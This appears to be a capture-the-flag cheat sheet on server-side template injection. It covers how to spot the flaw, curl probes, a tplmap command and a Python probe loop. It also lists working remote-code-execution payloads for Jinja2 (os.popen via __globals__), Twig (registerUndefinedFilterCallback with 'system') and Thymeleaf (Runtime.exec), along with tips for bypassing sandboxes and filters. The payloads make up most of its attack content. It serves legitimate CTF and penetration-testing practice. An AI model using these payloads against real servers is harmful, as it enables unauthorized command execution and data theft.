# Web Server-Side Template Injection

## When to suspect this

- User input appears in rendered pages, emails, PDFs, reports, error pages, or templates.
- Payloads like `{{7*7}}` evaluate to `49`.
- Source uses Jinja2, Twig, Mako, ERB, EJS, Pug, Smarty, Thymeleaf, Pongo2, Go templates.
- Errors mention template syntax, undefined variables, filters, or context objects.

## Fast triage checklist

- Find reflected input in server-rendered response.
- Test arithmetic delimiters for common engines.
- Identify template engine from errors/source/stack.
- Inspect available context: config, request, globals.
- Prove read primitive before RCE.
- Check sandbox/filter restrictions.
- Try blind output through timing or file write if response not reflected.

## Manual confirmation

```bash
curl -sk 'http://HOST/?name={{7*7}}'
curl -sk 'http://HOST/?name=${7*7}'
curl -sk 'http://HOST/?name=<%= 7*7 %>'
curl -sk 'http://HOST/?name={{config}}'
```

Positive signal:

- `49` appears.
- Template syntax error appears.
- Server-side objects such as config/request are rendered.

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| `curl` | Probe delimiters manually | `curl "$URL?name={{7*7}}"` | `49` |
| tplmap | After manual proof | `tplmap -u 'http://HOST/?name=*'` | Engine/RCE path |
| Burp Repeater | Test context with cookies | Inject template probes | Engine-specific response |
| Source notes | Engine-specific chains | [ctf-web/server-side.md](../ctf-web/server-side.md) | Correct payload family |

## Payload starter pack

Engine probes:

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
${{7*7}}
```

Jinja2:

```text
{{config}}
{{request}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Twig:

```text
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

Thymeleaf/Spring:

```text
${7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}
```

## Exploit skeleton

```python
#!/usr/bin/env python3
import requests

URL = "http://HOST/render"
PARAM = "name"
COOKIE = {"session": "COOKIE"}

payloads = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{config}}",
]

for p in payloads:
    r = requests.get(URL, params={PARAM: p}, cookies=COOKIE, timeout=10)
    print(f"\n== {p} status={r.status_code} len={len(r.text)} ==")
    print(r.text[:800])
```

## Escalation path

- Identify engine.
- Dump context/config/source.
- Read flag directly if file read primitive exists.
- If RCE is possible, run minimal read command (`cat /flag*`), not a noisy shell.
- If sandboxed, enumerate objects/classes/filters for escape gadgets.

## Common bypasses

- String construction without quotes: concat, `join`, hex escapes.
- Attribute access alternatives: `attr`, `format`, `getitem`.
- Case changes and whitespace/newline tricks.
- Filter bypass via globals, subclasses, request/config objects.
- Error page SSTI through XSS-to-SSTI chains.
- Path traversal to reach template file before injection.

## Rabbit holes

- Trying Jinja payloads against every engine.
- Going straight for RCE before proving context access.
- Missing blind SSTI when output is not reflected.
- Ignoring filters that transform payload before template render.

## Final solve checklist

- Engine is identified.
- Arithmetic/context proof is saved.
- Escape/RCE/file-read path is minimal.
- Final flag retrieval is reproducible.

